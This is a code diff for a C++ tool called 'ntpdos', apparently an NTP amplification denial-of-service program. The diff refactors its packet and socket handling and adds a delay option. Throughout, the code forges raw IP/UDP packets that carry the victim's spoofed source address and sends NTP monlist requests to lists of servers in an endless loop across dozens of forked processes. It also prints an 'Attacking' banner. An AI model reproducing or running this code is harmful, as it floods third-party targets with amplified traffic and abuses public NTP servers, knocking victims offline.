@@ -36,7 +36,7 @@
 #define ERR(str) std::cerr << "[-] ERROR: " << str << '\n'
 
 #define NTP_PORT 123
-#define DELAY 2000
+#define PKT_LEN 104
 
 struct ntp_req_t {
   unsigned char rm_vn_mode;     /* response, more, version, mode */
@@ -51,104 +51,77 @@ struct ntp_req_t {
   char mac[8];                  /* (optional) 8 byte auth code */
 };
 
-class Packet {
-  char pkt[sizeof(iphdr) + sizeof(udphdr) + sizeof(ntp_req_t)]{};
+struct SOCK {
+  int fd;
+  sockaddr_in dst;
+};
+
+unsigned short csum(unsigned short *addr, int len) {
+  unsigned long sum;
+  for (sum = 0; len > 0; len--)
+    sum += *addr++;
+  sum = (sum >> 16) + (sum & 0xffff);
+  sum += (sum >> 16);
+  return static_cast<unsigned short>(~sum);
+}
+
+void build_pkt(char *pkt, const char *src, const char *dst) {
   iphdr *ip{reinterpret_cast<iphdr *>(pkt)};
   udphdr *udp{reinterpret_cast<udphdr *>(pkt + sizeof(iphdr))};
   ntp_req_t *ntp{
       reinterpret_cast<ntp_req_t *>(pkt + sizeof(iphdr) + sizeof(udphdr))};
+  ip->version = 4;
+  ip->ihl = 5;
+  ip->tos = 0;
+  ip->tot_len = PKT_LEN;
+  ip->id = htons(rand());
+  ip->frag_off = 0;
+  ip->ttl = 255;
+  ip->protocol = IPPROTO_UDP;
+  ip->check = 0;
+  ip->saddr = inet_addr(src);
+  ip->daddr = inet_addr(dst);
 
-  unsigned short csum(unsigned short *addr, int len) {
-    unsigned long sum;
-    for (sum = 0; len > 0; len--)
-      sum += *addr++;
-    sum = (sum >> 16) + (sum & 0xffff);
-    sum += (sum >> 16);
-    return static_cast<unsigned short>(~sum);
+  udp->source = htons(rand());
+  udp->dest = htons(NTP_PORT);
+  udp->len = htons(sizeof(udphdr) + sizeof(ntp_req_t));
+  udp->check = 0;
+
+  ip->check = csum(reinterpret_cast<unsigned short *>(pkt), PKT_LEN);
+
+  ntp->rm_vn_mode = 0x27;
+  ntp->implementation = 0x03;
+  ntp->request = 0x2a;
+}
+
+SOCK make_socket(const char *dst) {
+  SOCK sock;
+  int on = 1;
+  sock.dst.sin_family = AF_INET;
+  sock.dst.sin_port = htons(NTP_PORT);
+  sock.dst.sin_addr.s_addr = inet_addr(dst);
+
+  if ((sock.fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
+    perror("[-] Error ");
+    exit(EXIT_FAILURE);
   }
 
-public:
-  Packet() = default;
-
-  Packet(std::string src, std::string dst) {
-    ip->version = 4;
-    ip->ihl = 5;
-    ip->tos = 0;
-    ip->tot_len = sizeof(pkt);
-    ip->id = htons(rand());
-    ip->frag_off = 0;
-    ip->ttl = 255;
-    ip->protocol = IPPROTO_UDP;
-    ip->check = 0;
-    ip->saddr = inet_addr(src.c_str());
-    ip->daddr = inet_addr(dst.c_str());
-
-    udp->source = htons(rand());
-    udp->dest = htons(NTP_PORT);
-    udp->len = htons(sizeof(udphdr) + sizeof(ntp_req_t));
-    udp->check = 0;
-
-    ip->check = csum(reinterpret_cast<unsigned short *>(pkt), sizeof(pkt));
-
-    ntp->rm_vn_mode = 0x27;
-    ntp->implementation = 0x03;
-    ntp->request = 0x2a;
+  if (setsockopt(sock.fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
+    perror("[-] Error ");
+    exit(EXIT_FAILURE);
   }
 
-  Packet(Packet const &o) = default;
-  Packet &operator=(Packet const &o) = default;
+  return sock;
+}
 
-  Packet(Packet &&o) = default;
-  Packet &operator=(Packet &&o) = default;
-
-  char *get() { return pkt; }
-  std::size_t size() { return sizeof(pkt); }
-
-  ~Packet() = default;
-};
-
-class Socket {
-  int fd = 0, on = 1;
-  sockaddr_in dest{};
-
-public:
-  Socket() = default;
-
-  Socket(std::string dst) {
-    dest.sin_family = AF_INET;
-    dest.sin_port = htons(NTP_PORT);
-    dest.sin_addr.s_addr = inet_addr(dst.c_str());
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
-      perror("[-] Error ");
-      exit(1);
-    }
-    if ((connect(fd, reinterpret_cast<sockaddr *>(&dest), sizeof(dest))) < 0) {
-      perror("[-] Error ");
-      close(fd);
-      exit(1);
-    }
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
-      perror("[-] Error ");
-      exit(1);
-    }
+void send(SOCK *sock, char *pkt) {
+  if (sendto(sock->fd, pkt, PKT_LEN, 0,
+             reinterpret_cast<sockaddr *>(&sock->dst), sizeof(sock->dst)) < 0) {
+    perror("[-] Error ");
+    close(sock->fd);
+    exit(EXIT_FAILURE);
   }
-
-  void send(Packet &pkt) {
-    if (sendto(fd, pkt.get(), pkt.size(), 0,
-               reinterpret_cast<sockaddr *>(&dest), sizeof(dest) < 0)) {
-      perror("[-] Error ");
-      close(fd);
-    }
-  }
-
-  Socket(Socket const &o) = default;
-  Socket &operator=(Socket const &o) = default;
-
-  Socket(Socket &&o) = default;
-  Socket &operator=(Socket &&o) = default;
-
-  ~Socket() { close(fd); };
-};
+}
 
 void version() { std::cout << "ntpdos " << VERSION << '\n'; }
 
@@ -162,7 +135,8 @@ void help() {
             << "  -T <file>    - list of target ip addresses\n"
             << "  -s <addr>    - ntp server ip address\n"
             << "  -S <file>    - list of ntp server ip addresses\n"
-            << "  -p <num>     - number of parallel processes (default: 80)\n\n"
+            << "  -p <num>     - number of parallel processes (default: 80)\n"
+            << "  -d <num>     - delay in microsecs (default: 1000)\n\n"
             << "misc:\n\n"
             << "  -V           - show version\n"
             << "  -H           - show help\n\n";
@@ -183,21 +157,22 @@ void load_file(std::string filename, std::vector<std::string> &vec) {
 }
 
 void attack(const std::vector<std::string> targets,
-            const std::vector<std::string> servers) {
+            const std::vector<std::string> servers, int delay) {
 
-  std::vector<Socket> sockets(servers.size());
+  std::vector<SOCK> sockets{};
 
   for (auto &server : servers)
-    sockets.emplace_back(server);
+    sockets.push_back(make_socket(server.c_str()));
 
   while (true) {
     for (auto &target : targets) {
       for (std::size_t i = 0; i < servers.size(); ++i) {
-        Packet pkt{target, servers[i]};
-        sockets[i].send(pkt);
+        char pkt[PKT_LEN]{};
+        build_pkt(pkt, target.c_str(), servers[i].c_str());
+        send(&sockets[i], pkt);
       }
     }
-    usleep(DELAY);
+    usleep(delay);
   }
 }
 
@@ -209,15 +184,22 @@ int main(int argc, char *argv[]) {
     exit(EXIT_FAILURE);
   }
 
-  int c{0}, processes{80};
+  int c{0}, processes{80}, delay{1000};
   std::vector<std::string> targets{}, servers{};
 
-  while ((c = getopt(argc, argv, "VHp:s:S:t:T:")) != -1) {
+  while ((c = getopt(argc, argv, "VHp:d:s:S:t:T:")) != -1) {
     switch (c) {
     case 'p':
       processes = std::strtol(optarg, NULL, 10);
       if (processes <= 0) {
         ERR("processes number can't be negative");
+        exit(EXIT_FAILURE);
+      }
+      break;
+    case 'd':
+      delay = std::strtol(optarg, NULL, 10);
+      if (delay <= 0) {
+        ERR("delay can't be negative");
         exit(EXIT_FAILURE);
       }
       break;
@@ -256,8 +238,12 @@ int main(int argc, char *argv[]) {
 
   for (int p = 0; p < processes; ++p) {
     if (fork())
-      attack(targets, servers);
+      attack(targets, servers, delay);
   }
+
+  std::cout << "Attacking " << targets.size() << " target/s with "
+            << servers.size() << " server/s\n"
+            << "Press CTRL+C to stop the attack\n";
 
   getc(stdin);
 
